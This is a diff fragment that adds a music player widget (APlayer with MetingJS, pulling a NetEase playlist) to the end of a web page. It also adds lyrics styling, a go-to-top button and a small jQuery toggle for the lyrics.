+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
